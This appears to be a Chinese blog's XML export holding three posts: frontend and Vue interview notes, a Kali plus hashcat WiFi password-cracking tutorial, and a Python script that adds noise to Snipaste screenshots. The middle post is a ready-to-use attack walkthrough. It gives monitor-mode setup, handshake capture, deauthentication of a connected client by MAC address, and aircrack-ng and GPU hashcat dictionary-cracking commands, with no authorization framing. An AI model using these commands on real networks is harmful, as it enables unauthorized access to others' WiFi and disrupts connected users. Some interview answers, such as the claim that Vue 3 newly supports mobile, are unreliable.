<p>行内元素和块级元素在网页布局中的主要区别有:</p>
<ol>
<li class="lvl-3">
<p>显示方式不同</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>行内元素不会独占一行,相邻行内元素会在同一行上继续排列。</p>
</li>
<li class="lvl-4">
<p>块级元素会独占整行,一个块级元素自己本身就会另起一行。</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p>宽高设置不同</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>行内元素的宽高由内容决定,不能手动设置宽高。</p>
</li>
<li class="lvl-4">
<p>块级元素可以手动设置元素的宽高。</p>
</li>
</ul>
<ol start="3">
<li class="lvl-3">
<p>内外边距不同</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>行内元素只能设置左右外边距,不能设置上下外边距。</p>
</li>
<li class="lvl-4">
<p>块级元素都可以设置。</p>
</li>
</ul>
<ol start="4">
<li class="lvl-3">
<p>内容模型不同</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>行内元素只占据内容空间,不存在内外边距。</p>
</li>
<li class="lvl-4">
<p>块级元素内容、内边距、边框、外边距都参与布局。</p>
</li>
</ul>
<ol start="5">
<li class="lvl-3">
<p>默认样式不同</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>行内元素几乎没有默认样式,显示为内容本身。</p>
</li>
<li class="lvl-4">
<p>块级元素有默认宽度等样式。</p>
</li>
</ul>
<p>典型的行内元素有 span、a,块级元素有 div、p 等。正确使用两种元素可以构建页面结构。</p>
<h3 id="vue2-里面的生命周期">vue2 里面的生命周期</h3>
<p>‍</p>
<h3 id="activited-和-isActivited-生命周期">activited 和 isActivited 生命周期</h3>
<p>缓存路由组件 <code>​ keep-alive</code>​</p>
<h3 id="兄弟组件通信方式">兄弟组件通信方式</h3>
<h3 id="v-if-和-v-show">v-if 和 v-show</h3>
<p>一个是直接移除 dom 元素, 一个改 css 的 display</p>
<p>v-show 适合频繁切换</p>
<h3 id="computed-和-watch">computed 和 watch</h3>
<p>计算属性和监听器</p>
<p>计算属性有缓存</p>
<p>watch 可以异步</p>
<h3 id="watch-和-watchEffect">watch 和 watchEffect</h3>
<p>watchEffect 自动收集依赖</p>
<h3 id="用过哪些内置指令">用过哪些内置指令</h3>
<p>// 提到 v-html 的 xxs 攻击并详细的举了几个例子，对应 innerHtml，v-text 对应 innerText，v-bind，v-model 语法糖通过 v-bind 绑定 oninput 事件实现，v-once…</p>
<h3 id="v-cloak-了解过吗？">v-cloak 了解过吗？</h3>
<p>‍</p>
<p>// 纯静态数据的 vue 代码，可以有一个预加载的效果</p>
<h3 id="webpack-用过吗？">webpack 用过吗？</h3>
<p>‍</p>
<p>// 答用得少，用 vite 多一点</p>
<h3 id="vite-用过哪些插件？">vite 用过哪些插件？</h3>
<p>// vite-plugin-compression（压缩成 gzip 格式，配合 nginx） ，unplugin-auto-import 自动导入，unplugin-vue-components 导入 vue 组件</p>
<p>rollup-plugin-visualizer 检查打包文件占用</p>
<h3 id="问部署方式？">问部署方式？</h3>
<p>// 聊了差不多 5 分钟，讲了讲传统部署 apache 手动上传 dist 文件 + 后端 jar 包指定端口运行，现代化部署自己搭建 jetkins + docker ci/ cd 流水线部署，免费的部署模式 vercel + 微信云托管 docker 动态扩容，和前者差不多，对于学生党比较友好，只需要购买域名并备案，其余不用花钱</p>
<h3 id="问对-docker-了解多少？">问对 docker 了解多少？</h3>
<p>// 答了相关的概念，最后询问，了解公司内部可能需要自己写 shell 脚本搭建 jetkins + docker 的 ci/cd 流水线</p>
<hr>
<h3 id="1、vue-的双向绑定原理是什么？里面的关键点在哪里？">1、vue 的双向绑定原理是什么？里面的关键点在哪里？</h3>
<p>object.defineProperty 和 proxy</p>
<h3 id="2、实现水平垂直居中的方式？">2、实现水平垂直居中的方式？</h3>
<h3 id="3、常用伪元素有哪一些？">3、常用伪元素有哪一些？</h3>
<h3 id="4、移动端如何适配不同屏幕尺寸？">4、移动端如何适配不同屏幕尺寸？</h3>
<h3 id="5、本地存储有哪一些？他们三者有什么区别？">5、本地存储有哪一些？他们三者有什么区别？</h3>
<h3 id="6、JS-的数据类型？如何判断-js-的数据类型">6、JS 的数据类型？如何判断 js 的数据类型?</h3>
<h3 id="7、说一下-ES6-的新特性有哪些？">7、说一下 ES6 的新特性有哪些？</h3>
<h3 id="8、Let、const、var-三者有什么区别？">8、Let、const、var 三者有什么区别？</h3>
<h3 id="9、数组去重有哪些办法？">9、数组去重有哪些办法？</h3>
<p>ES6 新增构造函数 set，利用 set 具有天然去重功能</p>
<p>数组迭代</p>
<h3 id="10、说一下深拷贝和浅拷贝，如何自己实现一个深拷贝？">10、说一下深拷贝和浅拷贝，如何自己实现一个深拷贝？</h3>
<h3 id="11、Vue-的生命周期有哪一些？说一下它们每个阶段做什么操作？">11、Vue 的生命周期有哪一些？说一下它们每个阶段做什么操作？</h3>
<h3 id="12、组件通讯方式有哪一些？">12、组件通讯方式有哪一些？</h3>
<h3 id="13、Vuex-有几个属性及作用？">13、Vuex 有几个属性及作用？</h3>
<h3 id="14、Vue-的监听属性和计算属性有什么区别？">14、Vue 的监听属性和计算属性有什么区别？</h3>
<h3 id="15、说一下防抖和节流。怎么实现？">15、说一下防抖和节流。怎么实现？</h3>
<h3 id="16、Vue-的导航守卫有哪一些？">16、Vue 的导航守卫有哪一些？</h3>
<h3 id="17、你的登录拦截怎么实现的？">17、你的登录拦截怎么实现的？</h3>
<h3 id="18、有用过图表吗？用的多吗？">18、有用过图表吗？用的多吗？</h3>
<h3 id="19、闭包是什么？如何实现？">19、闭包是什么？如何实现？</h3>
<h3 id="20、Vue2-0-和-vue3-0-有什么区别？">20、Vue2.0 和 vue3.0 有什么区别？</h3>
<p>Vue 2.0 和 Vue 3.0 之间有很多区别:</p>
<ol>
<li class="lvl-3">
<p>性能优化:Vue 3.0 采用 Proxy 实现响应式,速度比 Vue 2.0 中的 Object.defineProperty() 快很多。</p>
</li>
<li class="lvl-3">
<p>组合式 API:Vue 3.0 推出了 setup() ,可以更灵活地组合组件逻辑。</p>
</li>
<li class="lvl-3">
<p>新增的生命周期钩子:Vue 3.0 新增了 beforeUnmount、unmounted 等生命周期钩子函数。</p>
</li>
<li class="lvl-3">
<p>fragments :Vue 3.0 支持多根组件。</p>
</li>
<li class="lvl-3">
<p>Teleport:Vue 3.0 可以将组件挂载到父组件 DOM 之外。</p>
</li>
<li class="lvl-3">
<p>悬念组件和异步组件:更好的代码分割能力。</p>
</li>
<li class="lvl-3">
<p>移动平台支持:Vue 3.0 支持移动端平台。</p>
</li>
<li class="lvl-3">
<p>Typescript 支持:Vue 3.0 内置了 Typescript 的类型推断支持。</p>
</li>
<li class="lvl-3">
<p>新的全局 API:Vue 3.0 提供了 createApp() 等全局 API。</p>
</li>
<li class="lvl-4">
<p>更好的自身类型推断能力。</p>
</li>
</ol>
<p>总体来说,Vue 3.0 在性能、功能、类型支持等方面有很大提升,是一次重要的升级。</p>
<h3 id="21、Vue-常用的指令有哪些？">21、Vue 常用的指令有哪些？</h3>
<h3 id="22、v-If-和-v-show-有什么区别？">22、v-If 和 v-show 有什么区别？</h3>
<h3 id="23、v-for-为什么要加一个-key？">23、v-for 为什么要加一个 key？</h3>
<p>在 Vue 中使用 v-for 进行列表渲染时,添加 key 有以下重要作用:</p>
<ol>
<li class="lvl-3">
<p>区分不同元素,提高 diff 算法效率</p>
</li>
</ol>
<p>v-for 在更新已渲染过的元素列表时,依赖 key 值识别元素,如果没有 key,会默认使用 index,降低效率。</p>
<ol start="2">
<li class="lvl-3">
<p>触发过渡动画</p>
</li>
</ol>
<p>如果不使用 key,在执行列表过渡动画时,会默认执行就地更新动画,而不是移动动画。</p>
<ol start="3">
<li class="lvl-3">
<p>重用和重排元素</p>
</li>
</ol>
<p>使用 key 可以让 Vue 识别相同元素,复用已有元素而不是重新渲染。</p>
<ol start="4">
<li class="lvl-3">
<p>保持状态和位置</p>
</li>
</ol>
<p>使用 key 可以让 Vue 维持元素当前的状态和位置,避免重新渲染导致的状态丢失。</p>
<p>所以在使用 v-for 时,务必配合 <code>:key</code> ​ 使用,这对渲染优化非常关键。key 要使用唯一且稳定的标识,如 id、索引等。</p>
<h3 id="24、你是如何封装一个组件的？">24、你是如何封装一个组件的？</h3>
<h3 id="25、有自己从-0-到-1-搭建过项目吗？">25、有自己从 0 到 1 搭建过项目吗？</h3>
<h3 id="26、有用过-uni-app-吗？">26、有用过 uni-app 吗？</h3>
<h3 id="27、你会写后台吗？有搞过服务端渲染吗？">27、你会写后台吗？有搞过服务端渲染吗？</h3>
<h3 id="28、说一下你项目中遇到的难点，如何解决？">28、说一下你项目中遇到的难点，如何解决？</h3>
<h3 id="29、Url-到浏览器的一个过程有哪些步骤？">29、Url 到浏览器的一个过程有哪些步骤？</h3>
<h3 id="30、如何实现小程序的-request-封装及拦截？">30、如何实现小程序的 request 封装及拦截？</h3>
<h3 id="31、在-vue-的项目应用中，不使用框架，怎么封装？">31、在 vue 的项目应用中，不使用框架，怎么封装？</h3>
<h3 id="32、什么是-Js-原型？原型链是什么？">32、什么是 Js 原型？原型链是什么？</h3>
<h3 id="33、组件通讯方式有哪些？">33、组件通讯方式有哪些？</h3>
<h3 id="34、用闭包的原理做过哪些？">34、用闭包的原理做过哪些？</h3>
<h3 id="35、作用域是什么？">35、作用域是什么？</h3>
<h3 id="36、操作数组的方式有哪些？">36、操作数组的方式有哪些？</h3>
<h3 id="37、0-1-0-2-等于-0-3-吗？为什么？如何解决？">37、0.1 + 0.2 等于 0.3 吗？为什么？如何解决？</h3>
<h3 id="38、keep-alive-是什么？有哪几个生命周期阶段？">38、keep-alive 是什么？有哪几个生命周期阶段？</h3>
<h3 id="39、判断一个变量是否是数组，有哪些办法？">39、判断一个变量是否是数组，有哪些办法？</h3>
<h3 id="40、判断一个变量是否是对象，有哪些办法？">40、判断一个变量是否是对象，有哪些办法？</h3>
<h3 id="41、对象-数组常用方法有哪些？">41、对象/数组常用方法有哪些？</h3>
<h3 id="42、创建一个空数组-空对象有哪些方式？">42、创建一个空数组/空对象有哪些方式？</h3>
<h3 id="43、哪些遍历方式会改变原数组？">43、哪些遍历方式会改变原数组？</h3>
<h3 id="44、Set-和-Map-各是什么？">44、Set 和 Map 各是什么？</h3>
<h3 id="45、介绍一下-promise。">45、介绍一下 promise。</h3>
<p>46、Promise 通常会解决三种问题(1)链式回调(2)同时发起几个异步请求，谁先有结果就拿谁的(3)发起多个请求，等到所有请求后再做下一步处理这三种方式 promise 是怎么处理的？</p>
<h3 id="47、如何改变一个函数-a-的上下文？">47、如何改变一个函数 a 的上下文？</h3>
<h3 id="48、Call-和-apply-有什么区别？">48、Call 和 apply 有什么区别？</h3>
<h3 id="49、Evenbus-是什么东西？">49、Evenbus 是什么东西？</h3>
<h3 id="50、Vue-中普通的生命周期大概有哪些？">50、Vue 中普通的生命周期大概有哪些？</h3>
<h3 id="51、父子组件生命周期执行顺序是怎么样的？">51、父子组件生命周期执行顺序是怎么样的？</h3>
<h3 id="52、mixins-有几个生命周期阶段？">52、mixins 有几个生命周期阶段？</h3>
<h2 id="53、弹性布局，一行两列，一列固定宽，如何实现？">53、弹性布局，一行两列，一列固定宽，如何实现？</h2>
<h2 id="54、Flex：1-包含哪三种属性">54、Flex：1 包含哪三种属性</h2>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 kali + hashcat 破解 wifi 密码教程</title>
    <url>/20231122/%E4%BD%BF%E7%94%A8-kali-hashcat-%E7%A0%B4%E8%A7%A3-wifi-%E5%AF%86%E7%A0%81%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<blockquote>
<p>参考文档:</p>
<p>kali 破解wifi基本流程:</p>
<p><a href="https://zhuanlan.zhihu.com/p/603295597">https://zhuanlan.zhihu.com/p/603295597</a></p>
<p><a href="https://www.toutiao.com/article/6774378037413675523/">https://www.toutiao.com/article/6774378037413675523/</a></p>
<p>kali linux 官网:</p>
<p><a href="https://www.kali.org/">https://www.kali.org/</a></p>
<p>hash 官网:</p>
<p><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p>
<p>cuda tookit 官网:</p>
<p><a href="https://developer.nvidia.com/cuda-toolkit">https://developer.nvidia.com/cuda-toolkit</a></p>
<p>字典下载:</p>
<p><a href="https://weakpass.com/download">https://weakpass.com/download</a></p>
</blockquote>
<p>需要你有一块支持监听模式的无线网卡, 可以自行淘宝搜索kali网卡</p>
<h1>流程</h1>
<h2 id="kali-获取握手包">kali 获取握手包</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">提权</span><br><span class="line">sudo -i</span><br><span class="line">检查网卡是否支持监听</span><br><span class="line">airmon-ng</span><br><span class="line">自动杀掉可能影响监听的进程</span><br><span class="line">airmon-ng check <span class="built_in">kill</span></span><br><span class="line">启动监听模式</span><br><span class="line">airmon-ng start wlan0</span><br><span class="line"></span><br><span class="line">扫描附近wifi</span><br><span class="line">airodump-ng wlan0mon</span><br><span class="line">如果这里扫描不到, 请拔插网卡多次尝试以上命令</span><br><span class="line"></span><br><span class="line">监听握手包</span><br><span class="line">airodump-ng -c [信道] --bssid [路由器mac地址] -w [存储抓包文件位置] wlan0mon</span><br><span class="line">airodump-ng -c 6 --bssid 98:0D:51:F1:ED:78 -w /home/kali/wifi/ wlan0mon</span><br><span class="line"></span><br><span class="line">对连接设备进行攻击使其掉线</span><br><span class="line">aireplay-ng -0 10 -a [路由器mac地址] -c [客户端mac地址] wlan0mon</span><br><span class="line">aireplay-ng -0 10 -a 98:0D:51:F1:ED:78 -c 7C:D6:61:85:FD:BF wlan0mo</span><br></pre></td></tr></table></figure>
<h2 id="破解握手包">破解握手包</h2>
<p>获取到握手包之后, 可以使用kali自带的<code>aircrack-ng</code>进行破解, 但这种方法速度不快, 指令如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng  -a2 -b [路由器mac地址] -w [字典文件] /home/kali/wifi/-01.<span class="built_in">cap</span></span><br><span class="line">aircrack-ng  -a2 -b 98:0D:51:F1:ED:78 -w /usr/share/wordlists/wifite.txt /home/kali/wifi/-01.<span class="built_in">cap</span></span><br></pre></td></tr></table></figure>
<p>这里更推荐使用<code>hashcat</code>进行破解, <code>hashcat</code>可以调用gpu加速, 一个10G左右的字典只需要一小时左右</p>
<p>将linux内的<code>.cap</code>文件拷贝至windows内, 由于<code>hashcat</code>需要更新的格式, 转换网址为 <code>https://hashcat.net/cap2hashcat/</code><br /></p>
<p>要使用<code>hashcat</code>的GPU加速需要先安装<code>Cuda tookit</code>, 安装完成后, 在<code>hashcat</code>文件夹内打开命令行, 运行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./hashcat -m 22000 -D 2 D:\下载\683569_1700633546.hc22000 D:\下载\weakpass_3p\weakpass_3p</span><br></pre></td></tr></table></figure>
<p>等待完成即可</p>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Snipaste 自动给截图添加噪点</title>
    <url>/20231122/Snipaste-%E8%87%AA%E5%8A%A8%E7%BB%99%E6%88%AA%E5%9B%BE%E6%B7%BB%E5%8A%A0%E5%99%AA%E7%82%B9/</url>
    <content><![CDATA[<p>此功能需要用到Pro版的自定义命令功能</p>
<p>新建Python文件, 内容如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> win32clipboard</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_noise_and_distort_image</span>(<span class="params">image_path, output_path, noise_level=<span class="number">0.02</span>, distortion_level=<span class="number">5</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Add random noise and slight distortion to an image &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 打开图像并转换为numpy数组</span></span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    image_np = np.array(image)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加随机噪点</span></span><br><span class="line">    noise = np.random.randint(<span class="number">0</span>, <span class="number">256</span>, image_np.shape, dtype=np.uint8) * noise_level</span><br><span class="line">    noised_image_np = image_np + noise - (noise * noise_level)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 确保值在合理范围内</span></span><br><span class="line">    noised_image_np = np.clip(noised_image_np, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 轻微扭曲图像</span></span><br><span class="line">    rows, cols, ch = noised_image_np.shape</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">            <span class="keyword">if</span> random.random() &lt; <span class="number">0.05</span>: <span class="comment"># 随机选择5%的像素进行扭曲</span></span><br><span class="line">                dx = random.randint(-distortion_level, distortion_level)</span><br><span class="line">                dy = random.randint(-distortion_level, distortion_level)</span><br><span class="line">                new_x, new_y = <span class="built_in">min</span>(<span class="built_in">max</span>(j + dx, <span class="number">0</span>), cols - <span class="number">1</span>), <span class="built_in">min</span>(<span class="built_in">max</span>(i + dy, <span class="number">0</span>), rows - <span class="number">1</span>)</span><br><span class="line">                noised_image_np[i, j] = noised_image_np[new_y, new_x]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换回图像格式并保存</span></span><br><span class="line">    distorted_image = Image.fromarray(noised_image_np.astype(<span class="string">&#x27;uint8&#x27;</span>))</span><br><span class="line">    distorted_image.save(output_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_to_clipboard</span>(<span class="params">clip_type, data</span>):</span><br><span class="line">    win32clipboard.OpenClipboard()</span><br><span class="line">    win32clipboard.EmptyClipboard()</span><br><span class="line">    win32clipboard.SetClipboardData(clip_type, data)</span><br><span class="line">    win32clipboard.CloseClipboard()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python add_noise.py &lt;input_image_path&gt; &lt;output_image_path&gt; &lt;noise_level&gt; &lt;distortion_level&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    input_image_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    output_image_path = sys.argv[<span class="number">2</span>]</span><br><span class="line">    noise_level = <span class="built_in">float</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    distortion_level = <span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">    add_noise_and_distort_image(input_image_path, output_image_path, noise_level, distortion_level)</span><br><span class="line">  </span><br><span class="line"><span class="comment">#    image_path = r&#x27;output.png&#x27;  # 图片绝对路径</span></span><br><span class="line">    image = Image.<span class="built_in">open</span>(output_image_path)</span><br><span class="line">    output = BytesIO()</span><br><span class="line">    image.convert(<span class="string">&quot;RGB&quot;</span>).save(output, <span class="string">&quot;BMP&quot;</span>)</span><br><span class="line">    data = output.getvalue()[<span class="number">14</span>:]</span><br><span class="line">    output.close()</span><br><span class="line">    send_to_clipboard(win32clipboard.CF_DIB, data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>命名为<code>add_noise.pyw</code>, 注意, 需要使用pip下载相关依赖</p>
<p>在Snipaste中, 添加自定义命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">snip -o <span class="string">&quot;D:\Temp\add_noise_input.png&quot;</span>;<span class="built_in">exec</span>(cmd /c <span class="string">&quot;D:\Temp\add_noise.pyw&quot;</span> <span class="string">&quot;D:\Temp\add_noise_input.png&quot;</span> <span class="string">&quot;D:\Temp\add_noise_output.png&quot;</span> <span class="number">0.5</span> <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<p>指定快捷键即可使用</p>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>snipaste</tag>
      </tags>
  </entry>
</search>
